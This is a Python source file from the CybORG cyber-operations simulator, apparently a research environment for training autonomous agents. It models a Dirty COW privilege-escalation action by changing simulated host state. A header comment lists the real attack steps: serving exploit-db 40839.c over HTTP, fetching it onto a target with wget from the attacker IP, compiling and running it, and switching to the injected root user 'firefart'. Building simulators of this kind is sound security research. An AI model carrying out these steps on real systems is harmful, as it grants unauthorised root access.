# Copyright DST Group. Licensed under the MIT license.
from ipaddress import IPv4Address

from CybORG.Shared.Actions.ShellActionsFolder.ShellPrivilegeEscalationFolder.ShellPrivilegeEscalation import ShellPrivilegeEscalation


# May want to separate this action into two actions which takes a session each in future, rather than one action that
# takes two sessions
#
# Steps to perform exploit are as follows:
# On Attacker, with current dir as root:
# cp /usr/share/exploitdb/exploits/linux/local/40839.c ~
# python -m SimpleHTTPServer 8080
# On PublicFacing or other target box:
# cd /tmp
# wget http://<Attacker IP>:8080/40839.c
# gcc -pthread -lcrypt 40839.c -o 40839
# ./40839
# Prompted to create a password at this point, enter "password", then there will be a delay
# su firefart
# Now prompted for password, enter "password"
# gives a root privileged session as user firefart (which has replaced root user in /etc/passwd file)
from CybORG.Shared.Enums import FileType
from CybORG.Shared.Observation import Observation
from CybORG.Simulator.State import State


class DirtyCowPrivilegeEscalation(ShellPrivilegeEscalation):
    def __init__(self, session: int, agent: str, target_session: int):
        super().__init__(session, agent, target_session)

    def sim_execute(self, state: State):
        self.obs = Observation()
        self.obs.set_success(False)
        if self.session not in state.sessions[self.agent]:
            return self.obs
        # get hosts
        attacker_session = state.sessions[self.agent][self.session]
        user = attacker_session.user
        attacker_host = attacker_session.host

        if not attacker_session.active:
            self.obs.set_success(False)
            return self.obs

        # get file from attacker to target
        dirty_cow_c_file = None
        readable = False
        for file in attacker_host.files:
            if file.file_type == FileType.DirtyCowCode:
                dirty_cow_c_file = file
                readable = file.check_readable(user)
                break

        if dirty_cow_c_file is None:
            self.obs.set_success(False)
            return self.obs
        if not readable:
            self.obs.set_success(False)
            return self.obs

        self.obs.add_file_info(hostid="hostid0", path=dirty_cow_c_file.path, file_type=dirty_cow_c_file.file_type, name=dirty_cow_c_file.name)

        self.run_web_server(attacker_session)

        self.copy_files_to_webserver(attacker_session, dirty_cow_c_file)

        if self.target_session not in state.sessions[self.agent]:
            return self.obs

        target_session = state.sessions[self.agent][self.target_session]
        if not target_session.active:
            self.obs.set_success(False)
            return self.obs

        attacker_ip = None
        if attacker_session.host == target_session.host:
            attacker_ip = IPv4Address("127.0.0.1")
            target_ip = IPv4Address("127.0.0.1")
        else:
            for interface in attacker_session.host.interfaces:
                if interface.name != "lo":
                    for interface2 in target_session.host.interfaces:
                        if interface.ip_address in interface2.subnet.cidr.hosts():
                            attacker_ip = interface.ip_address
                            target_ip = interface2.ip_address
                            break

        if attacker_ip is None:
            self.obs.set_success(False)
            return self.obs

        file = self.download_file(target_session, dirty_cow_c_file, attacker_ip, target_ip)

        if file is None:
            self.obs.set_success(False)
            return self.obs

        # compile file on target
        executable_file = self.compile_file(target_session, file)

        if executable_file is None:
            self.obs.set_success(False)
            return self.obs

        executed = self.execute_file(target_session, executable_file)
        if not executed:
            self.obs.set_success(False)
            return self.obs

        # switch user to firefart
        self.switch_user(target_session, "firefart", "password")
        self.obs.set_success(True)
        return self.obs

    def execute_file(self, session, file):
        if file.check_executable(session.user):
            for user in session.host.users:
                if user.uid == 0:
                    user.username = "firefart"
                    user.password = "password"
                    user.password_hash = "ro46DZg1ViGBs"
                    self.obs.add_user_info(hostid="hostid1", group_name="root", gid=0, username="firefart", uid=0, password="password", password_hash="ro46DZg1ViGBs")
                    return True
        return False
